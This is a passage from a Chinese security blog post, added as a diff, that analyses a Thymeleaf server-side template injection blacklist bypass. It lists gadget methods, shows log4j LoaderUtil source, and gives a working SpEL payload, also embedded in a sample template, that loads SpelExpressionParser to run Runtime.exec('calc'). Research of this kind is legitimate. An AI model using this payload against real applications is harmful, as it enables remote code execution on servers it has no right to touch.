+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ch</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">qos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">logback</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">core</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">OptionHelper</span><span style="color:#7f848e">#instantiateByClassNameAndParameter</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">//</span> <span style="color:#e06c75">getMethod</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ch</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">qos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">logback</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">core</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">joran</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">StringToObjectConverter</span><span style="color:#7f848e">#getValueOfMethod</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">springframework</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">core</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">MethodIntrospector</span><span style="color:#7f848e">#selectInvocableMethod</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">catalina</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">manager</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">SessionUtils</span><span style="color:#7f848e">#guessLocaleFromSession</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">//</span> <span style="color:#e06c75">invoke</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">tomcat</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IntrospectionUtils</span><span style="color:#7f848e">#setProperty</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">logging</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">log4j</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Base64Util</span><span style="color:#7f848e">#encode</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">tomcat</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IntrospectionUtils</span><span style="color:#7f848e">#callMethodN</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">tomcat</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IntrospectionUtils</span><span style="color:#7f848e">#getProperty</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">tomcat</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">buf</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ByteBufferUtils</span><span style="color:#7f848e">#cleanDirectBuffer</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">tomcat</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IntrospectionUtils</span><span style="color:#7f848e">#callMethod1</span>
+</span></span></code></pre></div><p>这里选择 <code>org.apache.logging.log4j.util.LoaderUtil</code> 类（虽然属于 <code>log4j</code> 依赖包，但比较常见）</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">loadClass</span><span style="color:#56b6c2">(</span><span style="color:#c678dd">final</span> <span style="color:#e06c75">String</span> <span style="color:#e06c75">className</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">isIgnoreTccl</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">forName</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">className</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">T</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">T</span> <span style="color:#61afef;font-weight:bold">newInstanceOf</span><span style="color:#56b6c2">(</span><span style="color:#c678dd">final</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">T</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">clazz</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">InstantiationException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IllegalAccessException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InvocationTargetException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">clazz</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getConstructor</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">newInstance</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">NoSuchMethodException</span> <span style="color:#e06c75">var2</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">clazz</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newInstance</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p>构造如下 payload</p>
+<pre tabindex="0"><code>${T(org.apache.logging.log4j.util.LoaderUtil).newInstanceOf(T(org.apache.logging.log4j.util.LoaderUtil).loadClass(&#39;org.springframework.expression.spel.standard.SpelExpressionParser&#39;)).parseExpression(&#34;T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)&#34;).getValue()}
+</code></pre><p>对应的模板文件 <code>hello.html</code> 为</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;!</span><span style="color:#e06c75">DOCTYPE</span> <span style="color:#e06c75">HTML</span><span style="color:#56b6c2">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">html</span> <span style="color:#e06c75">lang</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;en&#34;</span> <span style="color:#e06c75">xmlns</span><span style="color:#56b6c2">:</span><span style="color:#e06c75">th</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;http://www.thymeleaf.org&#34;</span><span style="color:#56b6c2">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">div</span> <span style="color:#e06c75">th</span><span style="color:#56b6c2">:</span><span style="color:#e06c75">fragment</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;header&#34;</span><span style="color:#56b6c2">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">h3</span><span style="color:#56b6c2">&gt;</span><span style="color:#e06c75">Spring</span> <span style="color:#e06c75">Boot</span> <span style="color:#e06c75">Web</span> <span style="color:#e06c75">Thymeleaf</span> <span style="color:#e06c75">Example</span><span style="color:#56b6c2">&lt;/</span><span style="color:#e06c75">h3</span><span style="color:#56b6c2">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">&lt;/</span><span style="color:#e06c75">div</span><span style="color:#56b6c2">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">div</span> <span style="color:#e06c75">th</span><span style="color:#56b6c2">:</span><span style="color:#e06c75">fragment</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;main&#34;</span><span style="color:#56b6c2">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">[[</span><span style="color:#e06c75">$</span><span style="color:#56b6c2">{</span><span style="color:#e06c75">T</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">logging</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">log4j</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">LoaderUtil</span><span style="color:#56b6c2">).</span><span style="color:#e06c75">newInstanceOf</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">T</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">logging</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">log4j</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">LoaderUtil</span><span style="color:#56b6c2">).</span><span style="color:#e06c75">loadClass</span><span style="color:#56b6c2">(</span>&#39;<span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">springframework</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">expression</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">spel</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">standard</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">SpelExpressionParser</span>&#39;<span style="color:#56b6c2">)).</span><span style="color:#e06c75">parseExpression</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)&#34;</span><span style="color:#56b6c2">).</span><span style="color:#e06c75">getValue</span><span style="color:#56b6c2">()}]]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">&lt;/</span><span style="color:#e06c75">div</span><span style="color:#56b6c2">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">&lt;/</span><span style="color:#e06c75">html</span><span style="color:#56b6c2">&gt;</span>
+</span></span></code></pre></div><h3 id="0x06-reference">0x06 Reference</h3>
+<p><a class="link" href="https://www.cnpanda.net/sec/1063.html"  target="_blank" rel="noopener"
+    >Thymeleaf SSTI 分析以及最新版修复的 Bypass</a></p>
+<p><a class="link" href="https://blog.0kami.cn/blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"  target="_blank" rel="noopener"
+    >Thymeleaf ssti 3.1.2 黑名单绕过</a></p>
+<p>本文原载于<a class="link" href="https://0zhanya.github.io/"  target="_blank" rel="noopener"
+    >0ZHan&rsquo;s Blog</a>，遵循CC BY-NC-SA 4.0协议，复制请保留原文出处。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/java%E5%AE%89%E5%85%A8/">Java安全</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://npm.elemecdn.com/@waline/emojis@1.1.0/bmoji"],"lang":"zh-CN","locale":{"admin":"站长","sofa":"还没有人评论哦！快来抢沙发吧~"},"placeholder":"欢迎留下宝贵的评论！","requiredMeta":["name","email","url"],"serverURL":"https://data-table-e038f1l82-0zhanya.vercel.app/"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 0ZHan&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
